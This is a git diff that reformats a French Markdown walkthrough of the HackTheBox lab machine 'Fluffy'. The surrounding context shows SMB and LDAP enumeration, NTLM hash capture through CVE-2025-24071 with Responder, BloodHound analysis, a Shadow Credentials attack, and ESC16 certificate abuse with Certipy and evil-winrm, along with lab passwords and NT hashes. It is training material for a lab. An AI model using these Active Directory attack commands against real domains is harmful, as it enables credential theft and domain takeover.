@@ -3,7 +3,7 @@ title: 'Fluffy'
 date: '2025-07-13'
 tags: ['NTLM Relay', 'Shadow Credentials', 'ESC16', 'Kerberoasting', 'BloodHound']
 draft: false
-summary: 'Guide complet de la machine HTB Fluffy, exploitant une vulnérabilité CVE-2025-24071 pour capturer des hachages NTLM, utilisant BloodHound pour l''analyse AD, et exploitant une vulnérabilité ESC16 sur l''Autorité de Certification pour obtenir les privilèges administrateur.'
+summary: "Guide complet de la machine HTB Fluffy, exploitant une vulnérabilité CVE-2025-24071 pour capturer des hachages NTLM, utilisant BloodHound pour l'analyse AD, et exploitant une vulnérabilité ESC16 sur l'Autorité de Certification pour obtenir les privilèges administrateur."
 images: ['/static/images/fluffy/logo.webp']
 ---
 
@@ -51,6 +51,7 @@ $ nmap -sC -sV 10.10.11.69
 ### Étape 1.2 : Configuration DNS
 
 - **Ajout dans /etc/hosts** :
+
 ```bash
 echo "10.10.11.69 DC01.fluffy.htb" >> /etc/hosts
 ```
@@ -60,6 +61,7 @@ echo "10.10.11.69 DC01.fluffy.htb" >> /etc/hosts
 ### Étape 2.1 : Énumération SMB
 
 - **Liste des partages** :
+
 ```bash
 $ smbclient -L //10.10.11.69
 ```
@@ -75,6 +77,7 @@ $ smbclient -L //10.10.11.69
 ### Étape 2.2 : Accès au partage IT
 
 - **Connexion avec les credentials fournis** :
+
 ```bash
 $ smbclient //10.10.11.69/IT -U j.fleischman
 Password: J0elTHEM4n1990!
@@ -88,6 +91,7 @@ Password: J0elTHEM4n1990!
 ### Étape 2.3 : Analyse du fichier PDF
 
 - **Téléchargement et analyse** :
+
 ```bash
 $ smbclient //10.10.11.69/IT -U j.fleischman -c "get Upgrade_Notice.pdf"
 ```
@@ -99,6 +103,7 @@ $ smbclient //10.10.11.69/IT -U j.fleischman -c "get Upgrade_Notice.pdf"
 ### Étape 2.4 : Énumération LDAP
 
 - **Requête LDAP avec authentification** :
+
 ```bash
 $ ldapsearch -x -H ldap://10.10.11.69 -D "j.fleischman@fluffy.htb" -w J0elTHEM4n1990! -b "DC=fluffy,DC=htb" > ldapsearch.txt
 ```
@@ -117,9 +122,10 @@ $ ldapsearch -x -H ldap://10.10.11.69 -D "j.fleischman@fluffy.htb" -w J0elTHEM4n
   - `Service Account Managers` (contient j.coffey, p.agila)
 
 ## 🎯 3. Exploitation de CVE-2025-24071
+
 🔐 CVE-2025-24071 est une vulnérabilité critique de type spoofing dans Windows File Explorer, révélée en mars 2025. Elle permet à un attaquant de voler des hashs NTLM (utilisés pour l’authentification réseau) sans interaction directe de l’utilisateur, simplement en extrayant une archive compressée contenant un fichier .library-ms malveillant.
 
-⚙️ **Mécanisme d’exploitation** : 
+⚙️ **Mécanisme d’exploitation** :
 
 Windows Explorer traite automatiquement les fichiers .library-ms pour en extraire des métadonnées.
 
@@ -161,11 +167,13 @@ $ sudo responder -I tun0
 ### Étape 3.5 : Déclenchement de l'attaque
 
 - **Connexion avec p.agila** :
+
 ```bash
 $ smbclient //10.10.11.69/IT -U "fluffy.htb\p.agila"
 ```
 
 - **Hachage capturé** et enregistrés dans /usr/share/responder/logs :
+
 ```
 [SMB] NTLMv2-SSP Client   : 10.10.11.69
 [SMB] NTLMv2-SSP Username : FLUFFY\p.agila
@@ -198,6 +206,7 @@ $ bloodhound-python -u p.agila -p prometheusx-303 -d fluffy.htb -c All -dc dc01.
   - 19 conteneurs
 
 BloodHound.py a généré des fichiers JSON :
+
 ```
 $ ls -ltr *.json
 -rw-rw-r-- 1 nnbb nnbb 23318 11 juil. 18:15 20250711181507_users.json
@@ -213,7 +222,7 @@ $ ls -ltr *.json
 
 #### Lance Neo4j : Utile dans des outils comme BloodHound pour visualiser des structures Active Directory et les relations entre comptes, groupes et permissions
 
-``` bash
+```bash
 $ sudo neo4j console
 ```
 
@@ -230,11 +239,11 @@ $ sudo neo4j console
 #### Chemins d'attaque
 
 - **Découverte** : `p.agila` est membre de `Service Account Managers` qui a `GenericAll` sur `Service Accounts`
-![chemin_1](/static/images/fluffy/chemin_1.png)
+  ![chemin_1](/static/images/fluffy/chemin_1.png)
 - **Service Accounts** a `GenericWrite` sur `ca_svc`, `ldap_svc` et `winrm_svc`
-![chemin_2](/static/images/fluffy/chemin_2.png)
+  ![chemin_2](/static/images/fluffy/chemin_2.png)
 - **winrm_svc** est membre de `Remote Management Users`
-![chemin_3](/static/images/fluffy/chemin_3.png)
+  ![chemin_3](/static/images/fluffy/chemin_3.png)
 
 ## 🔑 5. Attaque Shadow Credentials
 
@@ -251,21 +260,19 @@ $ bloodyAD --host '10.10.11.69' -d 'dc01.fluffy.htb' -u 'p.agila' -p 'prometheus
 L’attaque Shadow Credentials exploite les droits d’écriture (ici GenericWrite) sur le compte AD winrm_svc pour ajouter une clé publique à l’attribut msDS-KeyCredentialLink. Cette clé permet de générer un certificat, qui est ensuite utilisé pour obtenir un ticket Kerberos (TGT). Le TGT peut être converti en un hachage NTLM, utilisable pour l’authentification (par exemple, via evil-winrm).
 
 Utilisation des outils Faketime et Certipy :
+
 - **Faketime :**
-    L’attaque Shadow Credentials repose sur Kerberos, qui est sensible aux décalages horaires (erreur KRB_AP_ERR_SKEW). 
-    
-    Faketime permet de synchroniser l’horloge de votre machine avec celle du contrôleur de domaine pour éviter les erreurs de désynchronisation lors de l’authentification ou de la génération de tickets Kerberos.
-    
-    Sans synchronisation précise, les requêtes Kerberos échoueront, rendant l’attaque impossible.
+  L’attaque Shadow Credentials repose sur Kerberos, qui est sensible aux décalages horaires (erreur KRB_AP_ERR_SKEW).
+
+  Faketime permet de synchroniser l’horloge de votre machine avec celle du contrôleur de domaine pour éviter les erreurs de désynchronisation lors de l’authentification ou de la génération de tickets Kerberos.
+
+  Sans synchronisation précise, les requêtes Kerberos échoueront, rendant l’attaque impossible.
 
 - **Certipy :**
-    Certipy est un outil Python spécialisé pour les attaques AD, y compris Shadow Credentials. 
-    
-    Il simplifie l’ajout d’une clé msDS-KeyCredentialLink à un compte cible (winrm_svc) et génère un certificat pour obtenir un TGT Kerberos. 
-    
-    Contrairement à PyWhisker, Certipy est plus récent, mieux maintenu, et offre des options spécifiques pour les attaques basées sur les certificats.
-    
-    Il permet de manipuler directement les attributs AD via LDAP et de générer des fichiers .pfx pour l’authentification.
+  Certipy est un outil Python spécialisé pour les attaques AD, y compris Shadow Credentials.
+  Il simplifie l’ajout d’une clé msDS-KeyCredentialLink à un compte cible (winrm_svc) et génère un certificat pour obtenir un TGT Kerberos.
+  Contrairement à PyWhisker, Certipy est plus récent, mieux maintenu, et offre des options spécifiques pour les attaques basées sur les certificats.
+  Il permet de manipuler directement les attributs AD via LDAP et de générer des fichiers .pfx pour l’authentification.
 
 ```bash
 $ net time -S 10.10.11.69
@@ -280,13 +287,13 @@ $ faketime '2025-07-12 22:41:10' certipy shadow auto -u 'p.agila@fluffy.htb' -p 
 
 ```
 $ evil-winrm -i 10.10.11.69 -u winrm_svc -H '33bd09dcd697600edf6b3a7af4875767'
-                                        
+
 Evil-WinRM shell v3.7
-                                        
-Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                                                      
-                                        
+
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+
 Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
-                                        
+
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\winrm_svc\Documents> ls
 *Evil-WinRM* PS C:\Users\winrm_svc\Documents> cd ../
@@ -323,7 +330,7 @@ Mode                LastWriteTime         Length Name
 
 **Récupération du flag utilisateur : **
 
-``` Bash
+```Bash
 *Evil-WinRM* PS C:\Users\winrm_svc\Desktop> Get-Content .\user.txt
 ```
 
@@ -351,17 +358,17 @@ $ certipy find -vulnerable -u 'CA_SVC' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c
 
 **Description :**
 
-ESC16 est une mauvaise configuration où l’Autorité de Certification (CA) est configurée pour désactiver globalement l’extension de sécurité szOID_NTDS_CA_SECURITY_EXT (OID 1.3.6.1.4.1.311.25.2) dans tous les certificats qu’elle émet. 
+ESC16 est une mauvaise configuration où l’Autorité de Certification (CA) est configurée pour désactiver globalement l’extension de sécurité szOID_NTDS_CA_SECURITY_EXT (OID 1.3.6.1.4.1.311.25.2) dans tous les certificats qu’elle émet.
 
 Cette extension, introduite avec les mises à jour de sécurité de mai 2022 (KB5014754), est essentielle pour le "mappage fort de certificats", permettant aux contrôleurs de domaine (DC) de lier un certificat à un compte utilisateur ou ordinateur via son SID pour l’authentification.
 
-Quand l’OID 1.3.6.1.4.1.311.25.2 est ajouté au registre DisableExtensionList de la CA (sous HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA-Name>\PolicyModules\<PolicyModuleName>), tous les certificats émis n’incluent pas cette extension SID. 
+Quand l’OID 1.3.6.1.4.1.311.25.2 est ajouté au registre DisableExtensionList de la CA (sous HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA-Name>\PolicyModules\<PolicyModuleName>), tous les certificats émis n’incluent pas cette extension SID.
 
 Cela équivaut à activer le drapeau CT_FLAG_NO_SECURITY_EXTENSION pour tous les modèles de certificats.
 
 **Impact :**
 
-Si les DCs ne sont pas en mode "Full Enforcement" (StrongCertificateBindingEnforcement != 2), ils utilisent des méthodes de mappage plus faibles (par exemple, basées sur UPN ou DNS dans le SAN du certificat). 
+Si les DCs ne sont pas en mode "Full Enforcement" (StrongCertificateBindingEnforcement != 2), ils utilisent des méthodes de mappage plus faibles (par exemple, basées sur UPN ou DNS dans le SAN du certificat).
 
 Cette mauvaise configuration peut résulter d’un contournement par les administrateurs pour résoudre des problèmes de compatibilité post-mises à jour de mai 2022.
 
@@ -370,6 +377,7 @@ Cette mauvaise configuration peut résulter d’un contournement par les adminis
 #### Modification de l'UPN (userPrincipalName) de ca_svc pour correspondre à administrator
 
 ⚠️ Rôle du UPN dans ESC16 :
+
 - Dans ESC16, un attaquant peut demander un certificat en injectant un UPN arbitraire dans le champ SAN (Subject Alternative Name) de la requête.
 - Si la CA accepte cette requête sans validation stricte, elle émet un certificat valide pour un autre utilisateur, comme un administrateur.
 - Ce certificat peut ensuite être utilisé pour s’authentifier en tant que cet utilisateur privilégié, permettant une élévation de privilèges.
@@ -382,6 +390,7 @@ Certipy v5.0.3 - by Oliver Lyak (ly4k)
     userPrincipalName                   : administrator
 [*] Successfully updated 'ca_svc'
 ```
+
 Cette requete a exploité l'autorité de certification (AD CS) mal configurée pour usurper l’identité d’un utilisateur privilégié, ici administrator. Voici ce que chaque paramètre indique :
 
 🧩 Analyse des options :
@@ -433,6 +442,7 @@ $ faketime '2025-07-13 16:20:00' certipy auth -dc-ip '10.10.11.69' -pfx 'adminis
 ```bash
 $ evil-winrm -i 10.10.11.69 -u 'administrator' -H '8da83a3fa618b6e3a00e93f676c92a6e'
 ```
+
 ```
 *Evil-WinRM* PS C:\Users\Administrator\Desktop> ls
 
@@ -448,20 +458,24 @@ Mode                LastWriteTime         Length Name
 # 🎯 Résumé des techniques utilisées
 
 ## 🔍 Reconnaissance
+
 - **Nmap** : Scan de ports et services
 - **SMB** : Énumération des partages
 - **LDAP** : Énumération des utilisateurs et groupes AD
 
 ## 🎣 Capture de credentials
+
 - **CVE-2025-24071** : Exploitation d'une vulnérabilité Windows File Explorer
 - **Responder** : Capture de hachages NTLM
 - **Hashcat** : Craquage des hachages
 
 ## 🕵️ Analyse AD
+
 - **BloodHound** : Visualisation des relations AD
 - **Neo4j** : Base de données pour BloodHound
 
 ## 🔑 Élévation de privilèges
+
 - **Shadow Credentials** : Injection de clés d'authentification
 - **ESC16** : Exploitation de l'Autorité de Certification
 - **Certipy** : Outil spécialisé pour les attaques AD CS
@@ -481,4 +495,4 @@ Mode                LastWriteTime         Length Name
 - [Certipy Documentation](https://github.com/ly4k/Certipy)
 - [BloodHound Wiki](https://bloodhound.readthedocs.io/)
 - [ESC16 Vulnerability](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
-- [Shadow Credentials Attack](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) 
+- [Shadow Credentials Attack](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)
